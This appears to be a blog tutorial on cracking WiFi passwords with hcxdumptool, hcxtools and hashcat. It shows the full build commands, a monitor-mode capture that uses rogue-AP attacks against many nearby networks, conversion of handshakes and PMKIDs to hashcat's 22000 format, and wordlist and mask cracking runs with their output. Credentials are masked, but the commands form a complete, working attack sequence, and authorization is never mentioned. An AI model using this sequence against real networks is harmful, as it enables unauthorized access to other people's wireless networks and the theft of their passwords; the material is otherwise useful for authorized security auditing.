---
title: "WiFi cracking with hcxdumptool, hcxtools and hashcat"
published: true
---

[hcxdumptool](https://github.com/ZerBea/hcxdumptool) is an excellent WiFi security audit tool, it can capture packets from wlan devices, create dump files (for example pcapng) and discover potential weak points. [hcxtools](https://github.com/ZerBea/hcxtools) can convert these dump files to hash files which can be understood by [hashcat](https://github.com/hashcat/hashcat). `hashcat` can recover passwords if you use proper wordlists or mask attacks.

## hcxdumptool

You need an adapter which supports monitor mode and packet injection for example an Alfa adapter such as [AWUS036AXML](https://alfa-network.eu/alfa-usb-adapter-awus036axml) or [AWUS036ACHM](https://alfa-network.eu/awus036achm). Both of them are supported with excellent in-kernel drivers.

First create a `pcapng` dump file:

```
$ git clone git@github.com:ZerBea/hcxdumptool.git
$ cd hcxdumptool
$ make
fatal: No names found, cannot describe anything.
cc -O3 -Wall -Wextra -std=gnu99   -o hcxdumptool hcxdumptool.c -DVERSION_TAG=\"6.3.0\" -DVERSION_YEAR=\"2023\" -DSTATUSOUT -DNMEAOUT
$ sudo ./hcxdumptool -L

Requesting interface capabilities. This may take some time.
Please be patient...


available wlan devices:

phy idx hw-mac       virtual-mac  m ifname           driver (protocol)
---------------------------------------------------------------------------------------------
  0   3 xxxxxxxxxxxx xxxxxxxxxxxx + wlp6s0           iwlwifi (NETLINK)
  4  93 xxxxxxxxxxxx xxxxxxxxxxxx * wlp0s20f0u1      mt76x0u (NETLINK)

* active monitor mode available
+ monitor mode available
- no monitor mode available

bye-bye
$ sudo ./hcxdumptool -i wlp0s20f0u1 --rds=1 -F
CHA    LAST   R 1 3 P S    MAC-AP    ESSID (last EAPOL on top)  SCAN-FREQUENCY:   5700
-----------------------------------------------------------------------------------------
 [  9] 17:30:45 + +   + + xxxxxxxxxxxx <essid>
 [  2] 17:29:52   +   + + xxxxxxxxxxxx <essid>
 [  1] 17:29:46   +   + + xxxxxxxxxxxx <essid>
 [  1] 17:29:36   +   + + xxxxxxxxxxxx <essid>
 [ 40] 17:31:49 + + +   + xxxxxxxxxxxx <essid>
 [  1] 17:29:34   + +   + xxxxxxxxxxxx <essid>
 [ 36] 17:31:40 + +     + xxxxxxxxxxxx <essid>
 [ 12] 17:31:31 + +     + xxxxxxxxxxxx <essid>
 [ 11] 17:31:28 + +     + xxxxxxxxxxxx <essid>
 [ 11] 17:31:27 + +     + xxxxxxxxxxxx <essid>
 [ 11] 17:31:27 + +     + xxxxxxxxxxxx <essid>
 [ 11] 17:31:27 + +     + xxxxxxxxxxxx <essid>
 [ 10] 17:31:23 + +     + xxxxxxxxxxxx <essid>
 [ 11] 17:31:23 + +     + xxxxxxxxxxxx <essid>
 [ 11] 17:31:23 + +     + xxxxxxxxxxxx <essid>
 [ 10] 17:30:59 + +     + xxxxxxxxxxxx <essid>
 [ 10] 17:30:59 + +     + xxxxxxxxxxxx <essid>
 [  9] 17:30:59 + +     + xxxxxxxxxxxx <essid>
 [  9] 17:30:58 + +     + xxxxxxxxxxxx <essid>
 [ 10] 17:30:56 + +     + xxxxxxxxxxxx <essid>


   LAST   E 2 MAC-AP-ROGUE   MAC-CLIENT   ESSID (last M2ROGUE on top)
-----------------------------------------------------------------------------------------
 17:31:15   + xxxxxxxxxxxx xxxxxxxxxxxx <essid>
 17:29:40   + xxxxxxxxxxxx xxxxxxxxxxxx <essid>
 17:31:43     xxxxxxxxxxxx xxxxxxxxxxxx <essid>
 17:31:42     xxxxxxxxxxxx xxxxxxxxxxxx 
 17:31:42     xxxxxxxxxxxx xxxxxxxxxxxx <essid>
 17:31:18     xxxxxxxxxxxx xxxxxxxxxxxx <essid>
 17:31:16     xxxxxxxxxxxx xxxxxxxxxxxx 
 17:30:52     xxxxxxxxxxxx xxxxxxxxxxxx <essid>
 17:30:26     xxxxxxxxxxxx xxxxxxxxxxxx <essid>
 17:30:19     xxxxxxxxxxxx xxxxxxxxxxxx 
 17:29:48     xxxxxxxxxxxx xxxxxxxxxxxx 
 17:29:37     xxxxxxxxxxxx xxxxxxxxxxxx <essid>
 17:29:36     xxxxxxxxxxxx xxxxxxxxxxxx 
^C
3 errors during runtime

exit on sigterm

bye-bye
$ ls -la
total 2988
drwxr-xr-x. 1 gemesa gemesa    1832 Jun  2 17:29 .
drwxr-xr-x. 1 gemesa gemesa     970 Jun  1 19:37 ..
-rwxrwxrwx. 1 root   root    136068 Jun  2 17:32 20230602172917-wlp0s20f0u1.pcapng
...
```

## hcxtools

Convert it to [22000](https://hashcat.net/forum/thread-10253.html) hash format and view some information about the hashes:

```
$ git clone git@github.com:ZerBea/hcxtools.git
$ cd hcxtools
$ make
fatal: No names found, cannot describe anything.
mkdir -p .deps
cc -O3 -Wall -Wextra -std=gnu99    -MMD -MF .deps/hcxpcapngtool.d -o hcxpcapngtool hcxpcapngtool.c -lssl -lcrypto  -lz   -DVERSION_TAG=\"6.3.0\" -DVERSION_YEAR=\"2023\" -DWANTZLIB
cc -O3 -Wall -Wextra -std=gnu99    -MMD -MF .deps/hcxhashtool.d -o hcxhashtool hcxhashtool.c -lssl -lcrypto  -lcurl   -DVERSION_TAG=\"6.3.0\" -DVERSION_YEAR=\"2023\" -DWANTZLIB
cc -O3 -Wall -Wextra -std=gnu99   -MMD -MF .deps/hcxpsktool.d -o hcxpsktool hcxpsktool.c -lssl -lcrypto   -DVERSION_TAG=\"6.3.0\" -DVERSION_YEAR=\"2023\" -DWANTZLIB
cc -O3 -Wall -Wextra -std=gnu99   -MMD -MF .deps/hcxpmktool.d -o hcxpmktool hcxpmktool.c -lssl -lcrypto   -DVERSION_TAG=\"6.3.0\" -DVERSION_YEAR=\"2023\" -DWANTZLIB
cc -O3 -Wall -Wextra -std=gnu99   -MMD -MF .deps/hcxeiutool.d -o hcxeiutool hcxeiutool.c   -DVERSION_TAG=\"6.3.0\" -DVERSION_YEAR=\"2023\" -DWANTZLIB
cc -O3 -Wall -Wextra -std=gnu99   -MMD -MF .deps/hcxwltool.d -o hcxwltool hcxwltool.c   -DVERSION_TAG=\"6.3.0\" -DVERSION_YEAR=\"2023\" -DWANTZLIB
cc -O3 -Wall -Wextra -std=gnu99   -MMD -MF .deps/hcxhash2cap.d -o hcxhash2cap hcxhash2cap.c   -DVERSION_TAG=\"6.3.0\" -DVERSION_YEAR=\"2023\" -DWANTZLIB
cc -O3 -Wall -Wextra -std=gnu99    -MMD -MF .deps/wlancap2wpasec.d -o wlancap2wpasec wlancap2wpasec.c -lssl -lcrypto  -lcurl   -DVERSION_TAG=\"6.3.0\" -DVERSION_YEAR=\"2023\" -DWANTZLIB
cc -O3 -Wall -Wextra -std=gnu99    -MMD -MF .deps/whoismac.d -o whoismac whoismac.c -lssl -lcrypto  -lcurl   -DVERSION_TAG=\"6.3.0\" -DVERSION_YEAR=\"2023\" -DWANTZLIB
$ ./hcxpcapngtool ../hcxdumptool/20230602172917-wlp0s20f0u1.pcapng -o hash.22000
hcxpcapngtool 6.2.9 reading from 20230602172917-wlp0s20f0u1.pcapng...

summary capture file
--------------------
file name................................: 20230602172917-wlp0s20f0u1.pcapng
version (pcapng).........................: 1.0
operating system.........................: Linux 6.3.4-201.fc38.x86_64
application..............................: hcxdumptool 6.3.0
interface name...........................: wlp0s20f0u1
interface vendor.........................: 00c0ca
openSSL version..........................: 1.0
weak candidate...........................: 12345678
MAC ACCESS POINT.........................: xxxxxxxxxxxx (incremented on every new client)
MAC CLIENT...............................: xxxxxxxxxxxx
REPLAYCOUNT..............................: 62934
ANONCE...................................: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
SNONCE...................................: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
timestamp minimum (GMT)..................: 02.06.2023 17:29:22
timestamp maximum (GMT)..................: 02.06.2023 17:32:08
used capture interfaces..................: 1
link layer header type...................: DLT_IEEE802_11_RADIO (127)
endianness (capture system)..............: little endian
packets inside...........................: 602
packets received on 2.4 GHz..............: 513
packets received on 5 GHz................: 85
ESSID (total unique).....................: 91
BEACON (total)...........................: 86
BEACON on 2.4 GHz channel (from IE_TAG)..: 1 2 3 4 6 7 8 10 11 13 
BEACON on 5/6 GHz channel (from IE_TAG)..: 36 40 44 48 100 108 112 
BEACON (SSID wildcard/unset).............: 5
BEACON (SSID zeroed).....................: 1
PROBEREQUEST.............................: 17
PROBEREQUEST (directed)..................: 7
PROBERESPONSE (total)....................: 56
AUTHENTICATION (total)...................: 106
AUTHENTICATION (OPEN SYSTEM).............: 106
ASSOCIATIONREQUEST (total)...............: 9
ASSOCIATIONREQUEST (PSK).................: 9
REASSOCIATIONREQUEST (total).............: 3
REASSOCIATIONREQUEST (PSK)...............: 3
EAPOL messages (total)...................: 318
EAPOL RSN messages.......................: 318
EAPOLTIME gap (measured maximum msec)....: 14312
EAPOL ANONCE error corrections (NC)......: working
REPLAYCOUNT gap (suggested NC)...........: 4
EAPOL M1 messages (total)................: 278
EAPOL M2 messages (total)................: 12
EAPOL M3 messages (total)................: 23
EAPOL M4 messages (total)................: 5
EAPOL M4 messages (zeroed NONCE).........: 5
EAPOL pairs (total)......................: 23
EAPOL pairs (best).......................: 6
EAPOL ROGUE pairs........................: 2
EAPOL pairs written to 22000 hash file...: 6 (RC checked)
EAPOL M12E2 (challenge)..................: 2
EAPOL M32E2 (authorized).................: 4
RSN PMKID (useless)......................: 6
RSN PMKID (total)........................: 36
RSN PMKID (best).........................: 5
RSN PMKID ROGUE..........................: 4
RSN PMKID written to 22000 hash file.....: 5

frequency statistics from radiotap header (frequency: received packets)
-----------------------------------------------------------------------
 2412: 118	 2417: 58	 2422: 3	 2427: 32	
 2437: 86	 2442: 18	 2447: 25	 2452: 21	
 2457: 34	 2462: 109	 2467: 7	 2472: 2	
 5180: 23	 5200: 46	 5220: 9	 5240: 1	
 5260: 1	 5300: 1	 5500: 2	 5540: 1	
 5560: 1	


session summary
---------------
processed pcapng files................: 1
$ ./hcxhashtool --info=stdout -i hash.22000        
SSID.......: <ssid>
MAC_AP.....: xxxxxxxxxxxx (Private)
MAC_CLIENT.: xxxxxxxxxxxx (TP-LINK TECHNOLOGIES CO.,LTD.)
VERSION....: 802.1X-2001 (1)
KEY VERSION: WPA2
REPLAYCOUNT: 62934
RC INFO....: ROGUE attack / NC not required
MP M1M2 E2.: challenge
MIC........: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
HASHLINE...: WPA*02*xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx*xxxxxxxxxxxx*xxxxxxxxxxxx*xxxxxxxxxxxxxxxxxxxxxxxxxxxx*xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx*xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx*xx
...
```

## hashcat

Crack the password(s) with `hashcat` using a wordlist attack:

```
$ sudo dnf install hashcat
Last metadata expiration check: 2:13:54 ago on Fri 02 Jun 2023 03:57:22 PM CEST.
Package hashcat-6.2.6-2.fc38.x86_64 is already installed.
Dependencies resolved.
Nothing to do.
Complete!
$ sudo hashcat -m 22000 -a 0 hash.22000 wordlist.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 ) - Platform #1 [Intel(R) Corporation]
=============================================================
* Device #1: Intel(R) UHD Graphics 620, 6240/12596 MB (2047 MB allocatable), 24MCU

OpenCL API (OpenCL 3.0 PoCL 3.1  Linux, Release, RELOC, SPIR, LLVM 16.0.0, SLEEF, FP16, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
============================================================================================================================================
* Device #2: pthread-Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, skipped

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Hashes: 34 digests; 12 unique digests, 8 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1475 MB

Dictionary cache built:
* Filename..: wordlist.txt
* Passwords.: 9
* Bytes.....: 139
* Keyspace..: 9
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:xxxxxxxxxxxx:xxxxxxxxxxxx:<essid>:<password>
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:xxxxxxxxxxxx:xxxxxxxxxxxx:<essid>:<password>
                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Hash.Target......: hash.22000
Time.Started.....: Fri Jun  2 18:00:51 2023 (2 secs)
Time.Estimated...: Fri Jun  2 18:00:53 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (wordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       36 H/s (0.12ms) @ Accel:32 Loops:4 Thr:128 Vec:1
Recovered........: 2/12 (16.67%) Digests (total), 2/12 (16.67%) Digests (new), 1/8 (12.50%) Salts
Progress.........: 72/72 (100.00%)
Rejected.........: 0/72 (0.00%)
Restore.Point....: 9/9 (100.00%)
Restore.Sub.#1...: Salt:7 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: xxxxxxxxxxxx -> xxxxxxxxxxxx
Hardware.Mon.#1..: N/A

Started: Fri Jun  2 18:00:43 2023
Stopped: Fri Jun  2 18:00:54 2023
```

Where the cracked passwords are:

```
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:xxxxxxxxxxxx:xxxxxxxxxxxx:<essid>:<password>
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:xxxxxxxxxxxx:xxxxxxxxxxxx:<essid>:<password>
```

Crack the password(s) with `hashcat` using a mask attack:

```
$ sudo hashcat -m 22000 -a 3 hash.22000 ?d?d?d?d?d?d?d?d?d?d?d?d
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 ) - Platform #1 [Intel(R) Corporation]
=============================================================
* Device #1: Intel(R) UHD Graphics 620, 6240/12596 MB (2047 MB allocatable), 24MCU

OpenCL API (OpenCL 3.0 PoCL 3.1  Linux, Release, RELOC, SPIR, LLVM 16.0.0, SLEEF, FP16, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
============================================================================================================================================
* Device #2: pthread-Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, skipped

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Hashes: 34 digests; 12 unique digests, 8 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Optimizers applied:
* Zero-Byte
* Brute-Force
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1475 MB

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:xxxxxxxxxxxx:xxxxxxxxxxxx:<essid>:<password>
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:xxxxxxxxxxxx:xxxxxxxxxxxx:<essid>:<password>
                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Hash.Target......: hash.22000
Time.Started.....: Fri Jun  2 16:51:54 2023 (2 secs)
Time.Estimated...: Fri Jun  2 16:51:56 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: ?d?d?d?d?d?d?d?d?d?d?d?d [12]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      161 H/s (0.17ms) @ Accel:256 Loops:8 Thr:8 Vec:1
Recovered........: 2/12 (16.67%) Digests (total), 2/12 (16.67%) Digests (new), 1/8 (12.50%) Salts
Progress.........: 208/208 (100.00%)
Rejected.........: 0/208 (0.00%)
Restore.Point....: 26/26 (100.00%)
Restore.Sub.#1...: Salt:7 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: xxxxxxxxxxxx -> xxxxxxxxxxxx
Hardware.Mon.#1..: N/A

Started: Fri Jun  2 16:51:46 2023
Stopped: Fri Jun  2 16:51:57 2023
```

Where the cracked passwords are:

```
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:xxxxxxxxxxxx:xxxxxxxxxxxx:<essid>:<password>
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:xxxxxxxxxxxx:xxxxxxxxxxxx:<essid>:<password>
```
